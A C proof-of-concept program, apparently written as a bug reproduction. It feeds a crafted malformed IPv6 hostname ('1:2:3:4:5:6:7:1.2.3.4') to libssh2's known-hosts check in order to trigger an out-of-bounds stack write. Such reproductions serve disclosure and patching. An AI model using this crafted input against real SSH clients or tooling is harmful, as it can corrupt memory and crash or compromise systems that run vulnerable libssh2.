/*
 * PoC: crafted known-hosts PLAIN hostname triggers an out-of-bounds stack
 * write in the IPv6-literal comparison used by libssh2_knownhost_check().
 *
 * Drives only the public API with in-contract input: a stored known-hosts
 * entry added via libssh2_knownhost_addc(), then an untrusted hostname
 * checked via libssh2_knownhost_check().
 */

#include <libssh2.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    const char stored_host[] = "::1";
    const char checked_host[] = "1:2:3:4:5:6:7:1.2.3.4";
    const char key[] = "AAAA";
    const int typemask =
        LIBSSH2_KNOWNHOST_TYPE_PLAIN |
        LIBSSH2_KNOWNHOST_KEYENC_BASE64 |
        LIBSSH2_KNOWNHOST_KEY_SSHRSA;
    int rc;

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init() failed\n");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init() failed\n");
        return 1;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "libssh2_knownhost_init() failed\n");
        return 1;
    }

    rc = libssh2_knownhost_addc(hosts, stored_host, NULL, key, strlen(key),
                                NULL, 0, typemask, NULL);
    if(rc) {
        fprintf(stderr, "libssh2_knownhost_addc() failed: %d\n", rc);
        libssh2_knownhost_free(hosts);
        libssh2_session_free(session);
        return 1;
    }

    /* checked_host is attacker-influenced input; a crafted malformed IPv6
     * literal with 7 leading hex groups followed by an embedded IPv4
     * suffix reaches the vulnerable word-count bound in the known-hosts
     * IPv6 comparison helper.
     */
    rc = libssh2_knownhost_check(hosts, checked_host, key, strlen(key),
                                 typemask, NULL);

    printf("libssh2_knownhost_check() returned %d\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();

    return 0;
}
